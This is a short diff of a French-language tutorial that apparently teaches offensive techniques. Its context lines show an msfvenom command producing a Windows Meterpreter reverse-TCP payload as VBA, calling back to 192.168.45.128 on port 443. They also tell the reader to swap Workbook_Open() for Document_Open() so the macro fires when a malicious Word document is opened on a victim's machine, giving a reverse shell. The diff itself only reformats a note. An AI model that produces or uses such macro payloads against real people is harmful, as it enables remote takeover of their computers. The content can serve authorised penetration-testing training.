@@ -41,7 +41,8 @@ Créons maintenant une charge utile Meterpreter en mémoire à l'aide du framewo
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.128 LPORT=443 -f vba
 ```
 
-> [!NOTE] une modification doit être effectuée pour que cela fonctionne.
+NB: *Une modification doit être effectuée pour que cela fonctionne.*
+
 > Le résultat fonctionnera sur une feuille MS Excel. Par conséquent, remplacez  `Workbook_Open()` par  `Document_Open()` pour le rendre adapté aux documents MS Word.
 > 
 > Une fois le document MS Word malveillant ouvert sur la machine victime, nous devrions recevoir un shell inversé.
